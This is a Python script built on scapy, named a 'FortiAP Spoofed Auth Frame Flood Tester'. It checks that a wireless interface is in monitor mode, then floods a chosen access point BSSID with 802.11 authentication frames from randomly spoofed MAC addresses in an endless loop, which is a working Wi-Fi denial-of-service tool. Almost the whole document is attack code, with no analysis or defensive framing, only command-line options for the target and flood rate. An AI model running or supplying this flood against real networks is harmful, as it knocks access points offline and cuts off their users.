#!.venv/bin/python3
import argparse
import random
import time
import subprocess
from scapy.all import RadioTap, Dot11, Dot11Auth, sendp, RandMAC
import signal
import sys

from scapy.all import RadioTap, Dot11, Dot11Auth, sendp, RandMAC
import struct
import random
import subprocess

def build_radiotap():
    # Explicitly set rate (2 = 1Mbps), tx flags, channel info
    return RadioTap(
        present='Rate+TXFlags',
        Rate=2,          # 1 Mbps — lowest rate, most compatible
        TXFlags=0x0008   # No ACK expected (critical for spoofed frames)
    )

def random_mac():
    return f"{random.randint(0,255):02x}:{random.randint(0,255):02x}:{random.randint(0,255):02x}:{random.randint(0,255):02x}:{random.randint(0,255):02x}:{random.randint(0,255):02x}"

def check_monitor_mode(iface):
    result = subprocess.run(['iwconfig', iface], capture_output=True, text=True)
    if 'Monitor' not in result.stdout:
        raise RuntimeError(f"{iface} is not in monitor mode. Run: sudo airmon-ng start <iface>")


def generate_spoofed_auth_frames(iface, target_bssid, num_clients=500, packets_per_client=3, delay=0.001):
    check_monitor_mode(iface)
    print(f"[*] Starting auth flood on {iface} targeting BSSID {target_bssid}")

    sent = 0
    try:
        while True:
            for _ in range(num_clients):
                src_mac = random_mac()

                auth_frame = (
                    RadioTap(present='Rate+TXFlags', Rate=2, TXFlags=0x0008) /
                    Dot11(
                        type=0, subtype=11,
                        addr1=target_bssid,
                        addr2=src_mac,
                        addr3=target_bssid,
                        FCfield=0  # No DS flags for client->AP auth
                    ) /
                    Dot11Auth(algo=0, seqnum=1, status=0)
                )

                sendp(auth_frame, iface=iface, verbose=False,
                      count=packets_per_client, inter=delay)
                sent += packets_per_client

                if sent % 500 == 0:
                    print(f"[+] Sent {sent} frames...")

    except KeyboardInterrupt:
        print(f"\n[!] Stopped. Total frames sent: {sent}")

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="FortiAP Spoofed Auth Frame Flood Tester")
    parser.add_argument("-i", "--interface", required=True, help="Monitor mode interface (e.g., wlan0mon)")
    parser.add_argument("-b", "--bssid", required=True, help="Target FortiAP BSSID/MAC (e.g., aa:bb:cc:dd:ee:ff)")
    parser.add_argument("-c", "--clients", type=int, default=500, help="Number of unique spoofed clients (default: 500)")
    parser.add_argument("-p", "--packets", type=int, default=3, help="Packets per client (default: 3)")
    parser.add_argument("-d", "--delay", type=float, default=1, help="Delay between frames in seconds (default: 1)")
    
    args = parser.parse_args()
    
    generate_spoofed_auth_frames(args.interface, args.bssid, args.clients, args.packets, args.delay)
